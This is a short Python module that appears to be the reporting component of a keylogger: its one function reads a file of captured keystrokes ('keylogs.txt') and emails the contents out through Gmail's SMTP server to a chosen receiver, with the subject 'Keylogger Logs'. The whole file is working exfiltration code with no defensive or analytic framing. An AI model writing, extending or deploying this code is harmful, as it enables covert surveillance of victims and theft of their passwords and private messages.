import smtplib
from email.mime.text import MIMEText

def send_email_log(sender_email, password, receiver_email, subject="Keylogger Logs", log_file="keylogs.txt"):
    """Send the keylog file contents via email."""
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()

        msg = MIMEText(content)
        msg["Subject"] = subject
        msg["From"] = sender_email
        msg["To"] = receiver_email

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.send_message(msg)

        print("[*] Log file sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")